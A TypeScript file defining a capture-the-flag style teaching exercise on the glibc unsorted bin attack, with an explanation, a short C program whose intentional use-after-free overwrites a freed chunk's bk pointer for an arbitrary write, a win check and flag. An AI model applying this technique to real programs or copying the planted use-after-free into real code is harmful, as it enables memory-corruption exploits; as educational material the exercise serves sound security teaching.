import { Exercise } from '../types';

const ex21UnsortedBin: Exercise = {
  id: 'heap2-21',
  unitId: 'unit5-heap-ii',
  title: '21: Unsorted Bin Attack',
  desc: 'When large chunks (bigger than 64 bytes) are freed, they go into the <strong>unsorted bin</strong> \u2014 a doubly-linked list with both forward (fd) and backward (bk) pointers. When a chunk is removed from the unsorted bin during malloc, the allocator writes the bin address to <code>bk-&gt;fd</code>. By corrupting the bk pointer via a UAF, you control <strong>where</strong> that write goes \u2014 a powerful arbitrary write primitive.',
  source: {
    c: [
      { text: '#include <stdio.h>', cls: '' },
      { text: '#include <stdlib.h>', cls: '' },
      { text: '', cls: '' },
      { text: 'void win() { printf("FLAG\\n"); }', cls: '' },
      { text: '', cls: '' },
      { text: 'void (**handler)();  // at 0x0804a040', cls: '' },
      { text: '', cls: '' },
      { text: 'int main() {', cls: '' },
      { text: '    char *a = malloc(128);', cls: '' },
      { text: '    char *guard = malloc(16);', cls: '' },
      { text: '    // guard prevents top consolidation', cls: 'cmt' },
      { text: '    free(a);', cls: 'highlight' },
      { text: '    // a goes to unsorted bin', cls: 'cmt' },
      { text: '    // UAF: overwrite a\'s bk pointer', cls: 'cmt' },
      { text: '    *(void**)(a+4) = TARGET - 8;', cls: 'highlight vuln' },
      { text: '    char *b = malloc(128);', cls: 'highlight' },
      { text: '    // Unlink writes main_arena to bk->fd', cls: 'cmt' },
      { text: '    // TARGET now has a non-zero value!', cls: 'cmt' },
      { text: '    (*handler)();', cls: 'highlight' },
      { text: '    return 0;', cls: '' },
      { text: '}', cls: '' },
    ],
  },
  mode: 'heap-unsorted-bin',
  vizMode: 'heap',
  glibcVersion: '2.27',
  heapSize: 512,
  showSymbols: true,
  funcPtrAddr: 0x0804a040,
  check(_, heap, symbols) {
    return heap?.funcPtrs?.handler && heap.funcPtrs.handler.current !== symbols.normal && heap.funcPtrs.handler.current !== 0;
  },
  winTitle: 'FLAG{unsorted_bin}',
  winMsg: 'The unsorted bin is a doubly-linked list. When a chunk is removed during malloc, it writes the bin address (main_arena) to bk->fd. By corrupting bk, you controlled WHERE that write goes. This is the unsorted bin attack \u2014 a powerful write primitive.',
};

export default ex21UnsortedBin;
